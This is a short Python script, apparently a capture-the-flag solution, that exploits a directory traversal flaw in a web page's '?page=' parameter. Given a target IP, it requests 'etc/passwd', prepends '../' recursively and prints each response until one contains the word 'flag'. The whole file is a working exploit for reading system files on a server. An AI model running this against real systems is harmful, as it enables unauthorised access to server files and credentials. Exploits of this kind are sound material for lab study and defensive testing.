import sys
import requests
from bs4 import BeautifulSoup

_START = "http://"
_END = "/?page="
_FILE = "etc/passwd"

def inspect_recursion(site):
    r = requests.get(site + _FILE)
    s = BeautifulSoup(r.text, "html.parser")
    print(site + _FILE)
    print(s.script.string, '\n')
    if "flag" in s.script.string:
        return 1
    inspect_recursion(site + "../")

if __name__ == "__main__":
    try:
        arg = sys.argv[1]
    except IndexError:
        print("Usage: python3 inspect_recursion.py [ip]")
        sys.exit()
    try:
        inspect_recursion(_START + arg + _END)
    except:
        print("error during execution.")
        sys.exit()
